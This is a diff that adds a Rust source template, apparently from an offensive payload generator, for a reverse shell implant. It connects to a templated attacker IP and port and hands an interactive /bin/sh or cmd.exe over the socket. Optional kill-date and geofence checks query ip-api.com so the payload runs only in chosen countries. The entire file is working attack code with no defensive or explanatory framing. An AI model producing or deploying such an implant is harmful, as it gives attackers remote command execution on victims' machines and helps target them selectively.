@@ -1,0 +1,67 @@
+use std::net::TcpStream;
+use std::process::{Command, Stdio};
+use std::time::{SystemTime, UNIX_EPOCH};
+use std::io::{Read, Write};
+
+#[cfg(unix)]
+use std::os::unix::io::{AsRawFd, FromRawFd};
+
+#[cfg(windows)]
+use std::os::windows::io::{AsRawSocket, FromRawSocket};
+
+fn main() {
+    // Guardrails
+    {% if kill_date %}
+    let start = SystemTime::now();
+    let since_the_epoch = start.duration_since(UNIX_EPOCH).expect("Time went backwards");
+    // kill_date_ts is passed from engine
+    if since_the_epoch.as_secs() > {{ kill_date_ts }} {
+        return;
+    }
+    {% endif %}
+
+    {% if geofence %}
+    // Geofence check using TcpStream to ip-api.com
+    if let Ok(mut stream) = TcpStream::connect("ip-api.com:80") {
+        let req = "GET /line/?fields=countryCode HTTP/1.0\r\nHost: ip-api.com\r\n\r\n";
+        let _ = stream.write_all(req.as_bytes());
+        let mut resp = String::new();
+        let _ = stream.read_to_string(&mut resp);
+        if let Some(body_start) = resp.find("\r\n\r\n") {
+            let body = &resp[body_start+4..];
+            if !body.trim().starts_with("{{ geofence }}") {
+                return;
+            }
+        }
+    }
+    {% endif %}
+
+    let stream = TcpStream::connect("{{ ip }}:{{ port }}").unwrap();
+
+    #[cfg(unix)]
+    {
+        let fd = stream.as_raw_fd();
+        Command::new("/bin/sh")
+            .arg("-i")
+            .stdin(unsafe { Stdio::from_raw_fd(fd) })
+            .stdout(unsafe { Stdio::from_raw_fd(fd) })
+            .stderr(unsafe { Stdio::from_raw_fd(fd) })
+            .spawn()
+            .unwrap()
+            .wait()
+            .unwrap();
+    }
+
+    #[cfg(windows)]
+    {
+        let socket = stream.as_raw_socket();
+        Command::new("cmd.exe")
+            .stdin(unsafe { Stdio::from_raw_socket(socket) })
+            .stdout(unsafe { Stdio::from_raw_socket(socket) })
+            .stderr(unsafe { Stdio::from_raw_socket(socket) })
+            .spawn()
+            .unwrap()
+            .wait()
+            .unwrap();
+    }
+}
